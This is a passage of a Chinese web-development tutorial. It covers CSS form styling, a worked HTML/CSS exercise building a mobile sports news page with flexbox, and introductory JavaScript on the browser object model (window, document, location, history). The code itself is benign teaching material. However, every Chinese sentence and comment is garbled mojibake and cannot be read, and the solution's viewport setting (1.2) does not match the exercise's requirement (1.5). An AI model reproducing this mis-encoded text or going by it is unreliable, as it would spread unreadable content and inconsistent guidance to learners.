bolder;\n\tmargin: 10px;\n\t/*border: 1px solid red;*//*è®¾ç½®è¾¹æ¡†ä¾¿äºå¸ƒå±€æµ‹è¯•*/\n\ttext-shadow: 0 0 rgba(0,0,255,0.7),  \n\t\t\t\t -0.1em -0.1em 0.2em rgba(255,0,0,0.5),  \n\t\t\t\t 0.1em 0.1em 0.2em rgba(0,255,0,0.5);\n}\n\n.info-item{/*é¢˜ç›®3*/\n\tmargin: 10px;\n\tpadding: 3px;\n\t/*border: 1px solid green;*/\n\tborder-radius: 10px/6px;\n\tbackground-color: rgba(204,204,204,0.4);\n}\n.item-name {/*é¢˜ç›®4*/\n\twidth: 32%;\n\tdisplay: inline-block;/*è®©å—å…ƒç´ ä¿æŒåœ¨ä¸€è¡Œ*/\n\ttext-align: right;\n\tvertical-align: middle;/*æ–‡æœ¬å’Œè¾“å…¥åŸŸå‡è®¾ç½®å‚ç›´å±…ä¸­å¯¹é½*/\n}\n.item-inp{\n\twidth: 40%;\n\tbox-sizing:border-box;/*å¦åˆ™è®¾ç½®äº†èƒŒæ™¯å›¾åƒçš„è¾“å…¥åŸŸå› padding-leftè€Œå˜å®½*/\n\tdisplay: inline-block;\n\tvertical-align: middle;\n\tmargin-right:0.5em;\n}\n\n/*å¸¦æœ‰èƒŒæ™¯å›¾åƒçš„è¾“å…¥åŸŸæ ·å¼è®¾è®¡*/   \n/*:nth-child(1)çˆ¶å…ƒç´ çš„ç¬¬ä¸€ä¸ªå­å…ƒç´ ï¼Œä¹Ÿå°±æ˜¯ç¬¬ä¸€ä¸ªinfo-itemæ‰€åŒ…å«çš„input*/\n.info-item:nth-child(1) input{/*é¢˜ç›®5*/\n\tbackground: url(../images/name.gif) no-repeat;\n\tbackground-color: white;/*è®¾ç½®èƒŒæ™¯å›¾åƒåï¼Œé»˜è®¤çš„èƒŒæ™¯è‰²å°†ä¼šæ˜¯çˆ¶å…ƒç´ çš„èƒŒæ™¯è‰²ï¼ˆå¦‚æœå­˜åœ¨ï¼Œå¦åˆ™èƒŒæ™¯è‰²é€æ˜ï¼‰*/\n\tpadding-left: 20px;/*ä½¿å¾—contentè¾“å…¥åŒºåœ¨èƒŒæ™¯å›¾åƒå³è¾¹*/\n\tborder: 1px solid #ccc;/*å¦‚æœä¸é‡å®šä¹‰è¾¹æ¡†ï¼Œåˆ™ä¼šå› ä¸ºèƒŒæ™¯å›¾åƒçš„å½±å“è€Œå‡ºç°ç«‹ä½“è¾¹æ¡†*/\n\t\n}\n/*ç¬¬ä¸‰ä¸ªinfo-itemæ‰€åŒ…å«çš„input*/\n.info-item:nth-child(3) input {\n\tbackground: url(../images/password.gif) no-repeat;\n\tbackground-color: white;\n\tpadding-left: 20px; /*å¢åŠ å·¦å†…è¾¹è·æ¥æ”¾å›¾æ ‡*/\n\tborder: 1px solid #ccc;/*å¦‚æœä¸é‡å®šä¹‰è¾¹æ¡†ï¼Œåˆ™ä¼šå› ä¸ºèƒŒæ™¯å›¾åƒçš„å½±å“è€Œå‡ºç°ç«‹ä½“è¾¹æ¡†*/\n}\n\ninput:checked+span,input:checked+label {/*è®¾ç½®è¢«é€‰ä¸­çš„å•é€‰æŒ‰é’®å’Œå¤é€‰æ¡†åçš„æ–‡å­—çš„é¢œè‰²*/\n\tcolor: red;/*é¢˜ç›®6*/\n}\ntextarea{\n\twidth:60%;\n\tvertical-align:middle;\n}\n\n/*è®¾ç½®å¯¼èˆªé“¾æ¥çš„æ ·å¼*/\nul, li {\n\tbox-sizing: border-box;\n\tborder-radius: 10px/6px;\n\tbackground-color: rgba(204,204,204,0.4);\n}\nul {\n\tlist-style: none;\n\ttext-align:center;\n}\nli {\n\twidth: 22%;\n\tdisplay:inline-block;\n}\nli:nth-child(odd):hover {\n\ttransition: transform 1s ease-in-out;\n\ttransform: scale(1.2) rotate(-15deg);\n}\nli:nth-child(even):hover {\n\ttransition: transform 1s ease-in-out;\n\ttransform: scale(1.2) skew(30deg);\n}\n\n.star{color:#F00;}\n\n#title:target{/*è¿”å›é¡¶éƒ¨æ—¶æ”¹å˜titleå­—ä½“é¢œè‰²*/\n\tcolor:red;/*é¢˜ç›®7*/\n}\n```\n\n\n## HTML&CSSå®ä¾‹ç»ƒä¹ \n\n### ç›®çš„\n\n- æŒæ¡viewportè§†å£ï¼›\n\n- æŒæ¡**ul-li**åˆ—è¡¨ç»“æ„çš„åº”ç”¨ï¼›\n\n- æŒæ¡**dl-dt-dd**å®šä¹‰åˆ—è¡¨ç»“æ„çš„åº”ç”¨ï¼›\n- æŒæ¡å¼¹æ€§ç›’å¸ƒå±€ã€‚\n\n### é¢˜ç›®\n\n**è®¾è®¡æŸæµªç§»åŠ¨ç‰ˆç½‘ç«™é¦–é¡µçš„ä½“è‚²æ¿å—ï¼Œé¡µé¢æ•ˆæœå¦‚å›¾1ã€2æ‰€ç¤ºã€‚**\n\n> (1)\tè®¾ç½®é¡µé¢è§†åŒºå®½åº¦ä¸ºè®¾å¤‡å®½ï¼Œåˆå§‹ç¼©æ”¾æ¯”ä¾‹ä¸º1.0ï¼Œå…è®¸ç”¨æˆ·æœ€å¤§ç¼©æ”¾æ¯”ä¾‹ä¸º1.5ï¼Œæœ€å°ä¸º0.8ï¼›\n> (2)\tåˆ†åˆ«ä½¿ç”¨ul-liç»“æ„è®¾è®¡é¦–è¡Œâ€œä½“è‚²  ä¸­è¶…ã€è‹±è¶…ã€NBAâ€æ–‡æœ¬å¯¼èˆªé“¾æ¥å’Œâ€œå›½è¶³ã€è¥¿ç”²ã€æ¬§å† ã€CBAã€äºšå† â€å›¾ç‰‡å¯¼èˆªé“¾æ¥ï¼Œåœ¨ä¸¤è¡Œå¯¼èˆªé—´æ’å…¥æ°´å¹³çº¿ç”¨äºåˆ†éš”ï¼›\n> (3)\tæ–‡æœ¬å¯¼èˆªé“¾æ¥ä½¿ç”¨æµ®åŠ¨å®šä½ï¼Œå›¾ç‰‡å¯¼èˆªé“¾æ¥é‡‡ç”¨å¼¹æ€§ç›’å¸ƒå±€ï¼Œæ¯ä¸ªåˆ—è¡¨é¡¹ä¸­çš„å›¾ç‰‡å®½åº¦è‡ªé€‚åº”å˜åŒ–ï¼Œé™åˆ¶æœ€å¤§å®½åº¦70ä¸ªåƒç´ ï¼›\n> (4)\tä»ç¬¬ä¸‰è¡Œå¼€å§‹æ’å…¥å¤šæ¡æ–°é—»ä¸»é¢˜ï¼ŒåŒ…æ‹¬å›¾ç‰‡ã€æ ‡é¢˜å’Œè¯„è®ºæ•°å’Œè¯„è®ºå›¾æ ‡é“¾æ¥ï¼Œæ¯ä¸€æ¡æ–°é—»é‡‡ç”¨dl-dt-ddæ ‡ç­¾ç»“æ„æ¥è®¾è®¡ï¼Œæ¯ä¸€ä¸ªdlæ ‡ç­¾çš„é«˜åº¦ä¸º80ä¸ªåƒç´ ï¼Œè¯·ä½¿ç”¨å¼¹æ€§ç›’å¸ƒå±€æ¥è®¾è®¡ï¼Œéšè—å›¾ç‰‡æº¢å‡ºéƒ¨åˆ†ï¼Œè¯„è®ºæ•°å’Œè¯„è®ºå›¾æ ‡å‚ç›´å±…ä¸­å¯¹é½ã€‚\n> (5)\tåœ¨å¤šæ¡æ–°é—»ä¹‹åæ’å…¥â€œå±•å¼€æ›´å¤šâ€å¯¼èˆªåŠå…¶å›¾æ ‡ï¼Œè¦æ±‚å›¾æ ‡å’Œæ–‡å­—å‚ç›´å±…ä¸­å¯¹é½ï¼›\n> (6)\tæ³¨æ„é¡µé¢ä¸­ä¸åŒæ–‡æœ¬çš„å­—ä½“è®¾ç½®ï¼Œä½¿ç”¨emå•ä½ï¼Œå¹¶è®¾ç½®æ–°é—»ä¸­æ ‡é¢˜ä¸º1.5å€è¡Œè·ï¼›\n> (7)\tç›’å¸ƒå±€ä¸­é‡‡ç”¨box-flexè®¾ç½®å„å…ƒç´ å¤§å°è‡ªé€‚åº”ï¼Œè¦æ±‚é¡µé¢èƒ½å¤Ÿé€‚åº”ä¸åŒå±å¹•å®½åº¦çš„è®¾å¤‡ï¼Œå¦‚å›¾1å’Œå›¾2æ‰€ç¤ºã€‚\n\n| æ•ˆæœå›¾                                                  | æ•ˆæœå›¾                                                      |\n| ------------------------------------------------------- | ----------------------------------------------------------- |\n| ![å›¾1](https://img.jwt1399.top//img/20200811151956.png) | **![å›¾2](https://img.jwt1399.top//img/20200811152008.jpg)** |\n\n### è§£ç­”\n\n```html\n<!doctype html>\n<html>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0,maximum-scale=1.2, minimum-scale=0.8\"><!--é¢˜ç›®1-->\n<title>æŸæµªä½“è‚²</title>\n<style>\n/*è®¾ç½®é»˜è®¤æ ·å¼*/\n* {\n\tfont-size: 14px;\n}\n#sports{\n\twidth:95%;\n\tmin-width:410px;\n\tmargin: 10px auto;\n}\nul {\n\tlist-style: none;\n\tmargin: 0;\n\tpadding: 0;\n}\n/*é¢˜ç›®3*/\n/*è®¾ç½®é¦–è¡Œæ–‡æœ¬å¯¼èˆªæ ·å¼ï¼Œé‡‡ç”¨æµ®åŠ¨å®šä½*/\n.tit_list {\n\tpadding: 0;\n\tcolor:#06C;\n}\n\n.tit_list li {\n\tmargin:5px;\n\tfloat: right;\n}\n\n.tit_list li:first-child {\n\tfont-weight: bolder;\n\tfont-size: 1.2em;\n\tfloat: left;\n}\n/*é¢˜ç›®3*/\n/*è®¾ç½®å›¾ç‰‡å¯¼èˆªæ ·å¼ï¼Œé‡‡ç”¨å¼¹æ€§ç›’å¸ƒå±€*/\n.nav_items {\n\t/*margin: 10px auto;*/\n\tdisplay: -webkit-box;\n\tdisplay: box;\n\t/*border:1px dashed red;*/\n}\n\n.nav_items li {\n\ttext-align: center;\n\t-webkit-box-flex:1;\n\t/*border:1px dashed red;*/\n}\n\n.nav_items li img{ width:90%; max-width:70px;}/*æ ¹æ®åˆ—è¡¨é¡¹å®½åº¦ç¼©å°å›¾ç‰‡*/\n/*é¢˜ç›®4*/\n/*è®¾ç½®æ–°é—»é“¾æ¥æ ·å¼ï¼Œé‡‡ç”¨å¼¹æ€§ç›’å¸ƒå±€*/\ndl {\n\theight:80px;\n\tdisplay: -webkit-box;\n\tdisplay: box;\n\t-webkit-box-pack:justify;\n\toverflow: hidden;/*éšè—å›¾ç‰‡æº¢å‡ºéƒ¨åˆ†*/\n\t/*border:1px dashed red;*/\n}\n\ndt {\n\twidth:1%;/*é¿å…bug*/\n\tmargin-left:2%;\n\t-webkit-box-flex:4;\n\toverflow: hidden;\n\t/*border:1px dashed red;*/\n}\ndd {\n\twidth:1%;\n\tmargin-left:5%;\n\tmargin-right:2%;\n\t-webkit-box-flex:6;\n\tdisplay: -webkit-box;\n\tdisplay: box;\n\t-webkit-box-orient:vertical;\n\t/*border:1px dashed red;*/\n}\ndd h4 {/*é¢˜ç›®6*/\n\tfont-size: 1.1em;\n\tfont-weight:lighter;\n\tline-height: 1.5em;/* 1.5å€è¡Œè· */\n\tmargin: 0;\n\t-webkit-box-flex:6;\n}\n\ndd div {\n\t-webkit-box-flex:1;\n\ttext-align:right;\n}\ndd span{\n\tfont-size: 0.7em;\n}\n/*è®¾ç½®è¯„è®ºå›¾ç‰‡ä¸è¯„è®ºæ•°å‚ç›´å¯¹é½æ–¹å¼*/\nimg {\n\tvertical-align: middle;\n}\n</style>\n</head>\n\n<body>\n\t<section id=\"sports\">\n\t\t<ul class=\"tit_list\"><!--é¢˜ç›®2-->\n\t\t\t<li>ä½“è‚²</li>\n\t\t\t<li>NBA</li>\n\t\t\t<li>è‹±è¶…</li>\n\t\t\t<li>ä¸­è¶…</li>\n\t\t</ul>\n\t\t<hr width=\"98%\" color=\"#CCCCCC\" noshade><!--é¢˜ç›®2-->\n\t\t<ul class=\"nav_items\"><!--é¢˜ç›®2-->\n\t\t\t<li>\n\t\t\t\t<div><img src=\"images/guozu.jpg\"></div>\n\t\t\t\t<div>å›½è¶³</div>\n\t\t\t</li>\n\t\t\t<li>\n\t\t\t\t<div><img src=\"images/xijia.png\"></div>\n\t\t\t\t<div>è¥¿ç”²</div>\n\t\t\t</li>\n\t\t\t<li>\n\t\t\t\t<div><img src=\"images/ouguan.jpg\"></div>\n\t\t\t\t<div>æ¬§å† </div>\n\t\t\t</li>\n\t\t\t<li>\n\t\t\t\t<div><img src=\"images/cba.jpg\"></div>\n\t\t\t\t<div>CBA</div>\n\t\t\t</li>\n\t\t\t<li>\n\t\t\t\t<div><img src=\"images/yaguan.jpg\"></div>\n\t\t\t\t<div>äºšå† </div>\n\t\t\t</li>\n\t\t</ul>\n\t\t<hr width=\"98%\" color=\"#CCCCCC\" noshade>\n\t\t<dl ><!--é¢˜ç›®4-->\n\t\t\t<dt><img src=\"images/1.jpg\"/></dt>\n\t\t\t<dd>\n\t\t\t\t<h4>æ¸¸æ³³å† å†›èµ›å­™æ¨1500è‡ªå¤ºå†  è±ªå–äº”é‡‘åœ†æ»¡æ”¶å®˜</h4>\n\t\t\t\t<div><span> 578 <img src=\"images/timg.jpg\"/></span> </div>\n\t\t\t</dd>\n\t\t</dl>\n\t\t<hr width=\"98%\" color=\"#CCCCCC\" noshade>\n\t\t<dl>\n\t\t\t<dt><img src=\"images/2.jpg\"/></dt>\n\t\t\t<dd>\n\t\t\t\t<h4>æ¸¸æ³³å† å†›èµ›åˆ˜æ¹˜50è‡ªæŠ˜æ¡‚ å¾å˜‰ä½™æ”¶è·ç¬¬å››é‡‘</h4>\n\t\t\t\t<div><span> 8 <img src=\"images/timg.jpg\"/></span></div>\n\t\t\t</dd>\n\t\t</dl>\n\t\t<hr width=\"98%\" color=\"#CCCCCC\" noshade>\n\t\t<dl>\n\t\t\t<dt><img src=\"images/3.jpg\"/></dt>\n\t\t\t<dd >\n\t\t\t\t<h4 >è¢«ç§°ä¸­å›½å°åŒ—é˜Ÿ å°æ¹¾æ€¥äº†:å°æ¹¾ä¸æ˜¯ä¸­å›½å¤§é™†ä¸€éƒ¨åˆ†</h4>\n\t\t\t\t<div><span> 4174 <img src=\"images/timg.jpg\"/></span> </div>\n\t\t\t</dd>\n\t\t</dl>\n\t\t<hr width=\"98%\" color=\"#CCCCCC\" noshade>\n\t\t<dl>\n\t\t\t<dt><img src=\"images/4.jpg\"/></dt>\n\t\t\t<dd>\n\t\t\t\t<h4 >ä¸­è¶…-æ‰å“ˆç»´2çƒé›·é¸Ÿè‚–æ™ºå»ºåŠŸ å¯ŒåŠ›4-1è¾½è¶³è¿”æ¦œé¦–</h4>\n\t\t\t\t<div ><span> 1ä¸‡ <img src=\"images/timg.jpg\"/></span> </div>\n\t\t\t</dd>\n\t\t</dl>\n\t\t<hr width=\"98%\" color=\"#CCCCCC\" noshade>\n\t\t<dl>\n\t\t\t<dt><img src=\"images/5.jpg\"/></dt>\n\t\t\t<dd>\n\t\t\t\t<h4>æ›é½è¾¾å†…é“å®šç•™çš‡é©¬ï¼æ²¡å† å†›ä¹Ÿæ‰§æ•™ è·ä¸»å¸­åŠ›æŒº</h4>\n\t\t\t\t<div><span> 658 <img src=\"images/timg.jpg\"/></span> </div>\n\t\t\t</dd>\n\t\t</dl>\n\t\t<hr width=\"98%\" color=\"#CCCCCC\" noshade><!--é¢˜ç›®5-->\n\t\t<div style=\"text-align:center; color:#06C;\">å±•å¼€æ›´å¤š <img src=\"images/xiala.jpg\"/></div>\n\t</section>\n</body>\n</html>\n```\n\n## JavaScript\n\n> JavaScriptæ˜¯ä¸€ç§å±äºç½‘ç»œçš„è„šæœ¬è¯­è¨€,å·²ç»è¢«å¹¿æ³›ç”¨äºWebåº”ç”¨å¼€å‘,å¸¸ç”¨æ¥ä¸ºç½‘é¡µæ·»åŠ å„å¼å„æ ·çš„åŠ¨æ€åŠŸèƒ½,ä¸ºç”¨æˆ·æä¾›æ›´æµç•…ç¾è§‚çš„æµè§ˆæ•ˆæœã€‚\n\n### ç”¨æ³•\n\nHTML ä¸­çš„è„šæœ¬å¿…é¡»ä½äº `<script> ä¸ </script>` æ ‡ç­¾ä¹‹é—´ã€‚\n\n**å†…åµŒè„šæœ¬ï¼š**\n\n`<script>`æ ‡ç­¾æ”¾ç½®åœ¨ HTML é¡µé¢çš„` <body>`æˆ– `<head> `éƒ¨åˆ†ä¸­ã€‚\n\n```javascript\n<head>\n<script language=\"javascript\">\n\talert(\"æˆ‘çš„ç¬¬ä¸€ä¸ª JavaScript\");\n</script>\n</head>\n```\n\n**é“¾æ¥å¤–éƒ¨jsè„šæœ¬**:\n\n```javascript\n<script src=\"js/welcome.js\" type=\"text/javascript\"> </script>\n```\n\n### å‡½æ•°\n\n```javascript\nfunction abs(x) {\n    if (x >= 0) {\n        return x;\n    } else {\n        return -x;\n    }\n}\n```\n\nä¸Šè¿°`abs()`å‡½æ•°çš„å®šä¹‰å¦‚ä¸‹ï¼š\n\n- `function`æŒ‡å‡ºè¿™æ˜¯ä¸€ä¸ªå‡½æ•°å®šä¹‰ï¼›\n- `abs`æ˜¯å‡½æ•°çš„åç§°ï¼›\n- `(x)`æ‹¬å·å†…åˆ—å‡ºå‡½æ•°çš„å‚æ•°ï¼Œå¤šä¸ªå‚æ•°ä»¥`,`åˆ†éš”ï¼›\n- `{ ... }`ä¹‹é—´çš„ä»£ç æ˜¯å‡½æ•°ä½“ï¼Œå¯ä»¥åŒ…å«è‹¥å¹²è¯­å¥ï¼Œç”šè‡³å¯ä»¥æ²¡æœ‰ä»»ä½•è¯­å¥ã€‚\n\n### BOM\n\n> æµè§ˆå™¨å¯¹è±¡æ¨¡å‹(**Browser Object Model**)æä¾›äº†ç”¨æˆ·ä¸æµè§ˆå™¨å¯¹è±¡ä¹‹é—´äº¤äº’å’Œæ“ä½œçš„æ¥å£ã€‚åœ¨BOMä¸­ï¼Œå¯¹è±¡ä¹‹é—´å­˜åœ¨å±‚æ¬¡å…³ç³»ï¼Œwindowä¸ºé¡¶å±‚å¯¹è±¡ï¼Œæ‰€æœ‰å…¶å®ƒå¯¹è±¡éƒ½æ˜¯windowçš„å­å¯¹è±¡ã€‚\n\n#### BOM ä¸»è¦å¯¹è±¡\n\n**window:** BOMçš„æ ¸å¿ƒï¼Œé¡¶å±‚å¯¹è±¡ï¼Œè´Ÿè´£ä¸æµè§ˆå™¨äº¤äº’çš„æ“ä½œ\n**document:** ä»£è¡¨æµè§ˆå™¨è½½å…¥çš„æ–‡æ¡£(å¦‚HTMLæ–‡ä»¶)\n**navigator:**  åŒ…å«æµè§ˆå™¨ä¿¡æ¯(HTML5æ–°å¢geolocationå±æ€§)\n**history:** åŒ…å«æµè§ˆçª—å£è®¿é—®è¿‡çš„URL\n**location:** åŒ…å«å½“å‰æ–‡æ¡£URLçš„ä¿¡æ¯\n**screen:** åŒ…å«å®¢æˆ·ç«¯å±å¹•ä¿¡æ¯ï¼ˆç§»åŠ¨è®¾å¤‡ç‰¹åˆ«éœ€è¦ï¼‰\n**æœ¬åœ°å­˜å‚¨:**localStorageå’ŒsessionStorageï¼ˆHTML5æ–°å¢ï¼‰\n**ç¦»çº¿åº”ç”¨:**ï¼ˆHTML5æ–°å¢ï¼‰\n\n### **Window** å¯¹è±¡\n\n##### æ‰“å¼€ã€å…³é—­ã€è°ƒæ•´çª—å£\n\n```js\nwindow.open();//æ‰“å¼€ç©ºç™½çª—å£\n\nwindow.open('http://www.baidu.html');\n\nwindow.close();//å…³é—­çª—å£\n```\n\n##### è­¦å‘Šã€ç¡®è®¤ã€è¾“å…¥å¯¹è¯æ¡†\n\n| **æ–¹æ³•**  | **æè¿°**                                         |\n| --------- | ------------------------------------------------ |\n| alert()   | æ˜¾ç¤ºå¸¦æœ‰ä¸€æ®µæ¶ˆæ¯å’Œä¸€ä¸ªç¡®è®¤æŒ‰é’®çš„è­¦å‘Šæ¡†ã€‚         |\n| confirm() | æ˜¾ç¤ºå¸¦æœ‰ä¸€æ®µæ¶ˆæ¯ä»¥åŠç¡®è®¤æŒ‰é’®å’Œå–æ¶ˆæŒ‰é’®çš„å¯¹è¯æ¡†ã€‚ |\n| prompt()  | æ˜¾ç¤ºå¯æç¤ºç”¨æˆ·è¾“å…¥çš„å¯¹è¯æ¡†ï¼Œå¹¶è¿”å›ç”¨æˆ·è¾“å…¥ä¿¡æ¯ã€‚ |\n\n**altert(text)**\n\n```javascript\n<script>\n\talert(\"æµ‹è¯•ä¸€å“ˆ\");\n</script>\n```\n\n**confirm(text)**\n\n```javascript\n<script>\n\tvar r=confirm(\"Press a button\");\n \t if (r==true)\n   \t     alert(\"You pressed OK!\");  \n  \telse    \n \t    alert(\"You pressed Cancel!\") ;\n</script>\n```\n\n**prompt(text,default)**\n\n```html\n<!DOCTYPE html>\n<html>\n<head>\n\n\t<meta http-equiv=\"Content-Type\" content=\"text/html; charset=GBK\" />\n\t<title> è¾“å…¥å¯¹è¯æ¡† </title>\n</head>\n<body>\n\tä½ çš„åå­—æ˜¯ï¼š<span id=\"name\"></span>\n\t<script type=\"text/javascript\">\n\t\tname = prompt(\"è¯·è¾“å…¥ä½ çš„åå­—ï¼š\",\"ç®€ç®€\");\n\t\tdocument.getElementById(\"name\").innerHTML = name;\n\t</script>\n</body>\n</html>\n```\n\n### document **å¯¹è±¡**\n\n| å±æ€§            | æè¿°                                    |\n| :-------------- | :-------------------------------------- |\n| body            | è¿”å› <body> å…ƒç´                         |\n| forms           | è¿”å›æ‰€æœ‰è¡¨å•å…ƒç´ å¯¹è±¡ï¼Œå¯å½“æˆæ•°ç»„æ¥ä½¿ç”¨  |\n| cookie          | è®¾ç½®æˆ–è¿”å›ä¸å½“å‰æ–‡æ¡£æœ‰å…³çš„æ‰€æœ‰ cookieã€‚ |\n| domain          | è¿”å›å½“å‰æ–‡æ¡£çš„åŸŸåã€‚                    |\n| lastModified    | è¿”å›æ–‡æ¡£è¢«æœ€åä¿®æ”¹çš„æ—¥æœŸå’Œæ—¶é—´ã€‚        |\n| referrer        | è¿”å›è½½å…¥å½“å‰æ–‡æ¡£çš„æ–‡æ¡£çš„ URLã€‚          |\n| title           | è¿”å›å½“å‰æ–‡æ¡£çš„æ ‡é¢˜ã€‚                    |\n| URL             | è¿”å›å½“å‰æ–‡æ¡£çš„ URLã€‚                    |\n| readyState      | è¿”å›æ–‡æ¡£çš„ï¼ˆåŠ è½½ï¼‰çŠ¶æ€                  |\n| documentElement | è¿”å›æ–‡æ¡£æ ¹èŠ‚ç‚¹ï¼Œ<html>                  |\n| images          | è¿”å›æ‰€æœ‰Imageå¯¹è±¡ï¼Œ<img>                |\n\n```javascript\n<script>\n    alert(document.cookie);\n\twrite(document.URL);\n</script>;\n```\n#### document.formsçš„ç”¨æ³•\n\n| ä»£ç                         | ä½œç”¨                                                      |\n| --------------------------- | --------------------------------------------------------- |\n| document.forms              | è¡¨ç¤ºè·å–å½“å‰é¡µé¢çš„æ‰€æœ‰è¡¨å•                                |\n| document.forms[0]           | è¡¨ç¤ºè·å–å½“å‰é¡µé¢çš„ç¬¬ä¸€ä¸ªè¡¨å•                              |\n| document.forms['user_form'] | è¡¨ç¤ºè·å–å½“å‰é¡µé¢çš„name=\"user_form\"çš„è¡¨å•                  |\n| document.forms[0].submit()  | è¡¨ç¤ºæäº¤ç¬¬ä¸€ä¸ªformè¡¨å•  æäº¤åˆ°formé‡Œé¢çš„ actionæŒ‡å‘çš„åœ°æ–¹ |\n\n#### document å¯¹è±¡æ–¹æ³•\n\n| æ–¹æ³•                                                         | æè¿°                                                         |\n| :----------------------------------------------------------- | :----------------------------------------------------------- |\n| [close()](https://www.w3school.com.cn/jsref/met_doc_close.asp) | å…³é—­ç”¨ document.open() æ–¹æ³•æ‰“å¼€çš„è¾“å‡ºæµï¼Œå¹¶æ˜¾ç¤ºé€‰å®šçš„æ•°æ®ã€‚  |\n| [getElementById()](https://www.w3school.com.cn/jsref/met_doc_getelementbyid.asp) | è¿”å›å¯¹æ‹¥æœ‰æŒ‡å®š id çš„ç¬¬ä¸€ä¸ªå¯¹è±¡çš„å¼•ç”¨ã€‚                       |\n| [getElementsByName()](https://www.w3school.com.cn/jsref/met_doc_getelementsbyname.asp) | è¿”å›å¸¦æœ‰æŒ‡å®šåç§°çš„å¯¹è±¡é›†åˆã€‚                                 |\n| [getElementsByTagName()](https://www.w3school.com.cn/jsref/met_doc_getelementsbytagname.asp) | è¿”å›å¸¦æœ‰æŒ‡å®šæ ‡ç­¾åçš„å¯¹è±¡é›†åˆã€‚                               |\n| [open()](https://www.w3school.com.cn/jsref/met_doc_open.asp) | æ‰“å¼€ä¸€ä¸ªæµï¼Œä»¥æ”¶é›†æ¥è‡ªä»»ä½• document.write() æˆ– document.writeln() æ–¹æ³•çš„è¾“å‡ºã€‚ |\n| [write()](https://www.w3school.com.cn/jsref/met_doc_write.asp) | å‘æ–‡æ¡£å†™ HTML è¡¨è¾¾å¼ æˆ– JavaScript ä»£ç ã€‚                    |\n| [writeln()](https://www.w3school.com.cn/jsref/met_doc_writeln.asp) | ç­‰åŒäº write() æ–¹æ³•ï¼Œä¸åŒçš„æ˜¯åœ¨æ¯ä¸ªè¡¨è¾¾å¼ä¹‹åå†™ä¸€ä¸ªæ¢è¡Œç¬¦ã€‚  |\n\n```javascript\n<script>   \n    var a=1,b=2;\n    document.write(\"<h1>a+b</h1>\");\n    document.write(\"=\");\n    document.writeln(a+b);\n</script>\n```\n\n### location å¯¹è±¡\n\n| å±æ€§              | æè¿°                                          |\n| :---------------- | :-------------------------------------------- |\n| location.hash     | è®¾ç½®æˆ–è¿”å›ä»äº•å· (#) å¼€å§‹çš„ URLï¼ˆé”šï¼‰ã€‚       |\n| location.host     | è®¾ç½®æˆ–è¿”å›ä¸»æœºåå’Œå½“å‰ URL çš„ç«¯å£å·ã€‚         |\n| location.hostname | è®¾ç½®æˆ–è¿”å›å½“å‰ URL çš„ä¸»æœºåã€‚                 |\n| location.href     | è®¾ç½®æˆ–è¿”å›å®Œæ•´çš„ URLã€‚                        |\n| location.pathname | è®¾ç½®æˆ–è¿”å›å½“å‰ URL çš„è·¯å¾„éƒ¨åˆ†ã€‚               |\n| location.port     | è®¾ç½®æˆ–è¿”å›å½“å‰ URL çš„ç«¯å£å·ã€‚                 |\n| location.protocol | è®¾ç½®æˆ–è¿”å›å½“å‰ URL çš„åè®®ã€‚                   |\n| location.search   | è®¾ç½®æˆ–è¿”å›ä»é—®å· (?) å¼€å§‹çš„ URLï¼ˆæŸ¥è¯¢éƒ¨åˆ†ï¼‰ã€‚ |\n\n```javascript\n<script type=\"text/javascript\">\n\tvar loc = window.location;\n\tvar locStr = \"å½“å‰çš„locationä¿¡æ¯æ˜¯:\\n\";\n\t// éå†locationå¯¹è±¡çš„å…¨éƒ¨å±æ€§\n\tfor (var propname in loc)\n\t{\n\t\tlocStr += propname + \": \" + loc[propname] + \"\\n\"\n\t}\n\talert(locStr);\n</script>\n```\n\n| æ–¹æ³•      | æè¿°                     |\n| :-------- | :----------------------- |\n| assign()  | åŠ è½½æ–°çš„æ–‡æ¡£ã€‚           |\n| reload()  | é‡æ–°åŠ è½½å½“å‰æ–‡æ¡£ã€‚       |\n| replace() | ç”¨æ–°çš„æ–‡æ¡£æ›¿æ¢å½“å‰æ–‡æ¡£ã€‚ |\n\n```html\n<!doctype html>\n<html>\n<head>\n<title>locationå¯¹è±¡</title>\n</head>\n<body>\n<div id=\"typeMachine\" onclick = \"clcFun()\">æˆ³æˆ‘å•Š</div>\n<script>\n\tfunction clcFun () {\n\t\tdocument.write(location.href);//æ‰“å°å‡ºå½“å‰åœ°å€\n\t\t//window.location.reload();//é‡æ–°åŠ è½½htmlæ–‡æ¡£\n\t\t//window.location.href=\"http://www.baidu.com\"//æ‰“å¼€ç½‘é¡µ,æ–¹å¼1\n\t\t//window.location.assign(\"http://www.baidu.com\");//æ‰“å¼€ç½‘é¡µ,æ–¹å¼2\n\t\t//window.location.replace(\"http://www.baidu.com\");//æ‰“å¼€ç½‘é¡µ,æ–¹å¼3\n\t}\n</script>\n</body>\n</html>\n```\n\n### History å¯¹è±¡\n\n| å±æ€§ã€æ–¹æ³•                                                   | æè¿°                                |\n| :----------------------------------------------------------- | :---------------------------------- |\n| [length](https://www.w3school.com.cn/jsref/prop_his_length.asp) | è¿”å›æµè§ˆå™¨å†å²åˆ—è¡¨ä¸­çš„ URL æ•°é‡ã€‚   |\n| [back()](https://www.w3school.com.cn/jsref/met_his_back.asp) | åŠ è½½ history åˆ—è¡¨ä¸­çš„å‰ä¸€ä¸ª URLã€‚   |\n| [forward()](https://www.w3school.com.cn/jsref/met_his_forward.asp) | åŠ è½½ history åˆ—è¡¨ä¸­çš„ä¸‹ä¸€ä¸ª URLã€‚   |\n| [go()](https://www.w3school.com.cn/jsref/met_his_go.asp)     | åŠ è½½ history åˆ—è¡¨ä¸­çš„æŸä¸ªå…·ä½“é¡µé¢ã€‚ |\n\n### Navigator å¯¹è±¡\n\n| å±æ€§                                                         | æè¿°                                           |\n| :----------------------------------------------------------- | :--------------------------------------------- |\n| [appCodeName](https://www.w3school.com.cn/jsref/prop_nav_appcodename.asp) | è¿”å›æµè§ˆå™¨çš„ä»£ç åã€‚                           |\n| [appMinorVersion](https://www.w3school.com.cn/jsref/prop_nav_appminorversion.asp) | è¿”å›æµè§ˆå™¨çš„æ¬¡çº§ç‰ˆæœ¬ã€‚                         |\n| [appName](https://www.w3school.com.cn/jsref/prop_nav_appname.asp) | è¿”å›æµè§ˆå™¨çš„åç§°ã€‚                             |\n| [appVersion](https://www.w3school.com.cn/jsref/prop_nav_appversion.asp) | è¿”å›æµè§ˆå™¨çš„å¹³å°å’Œç‰ˆæœ¬ä¿¡æ¯ã€‚                   |\n| 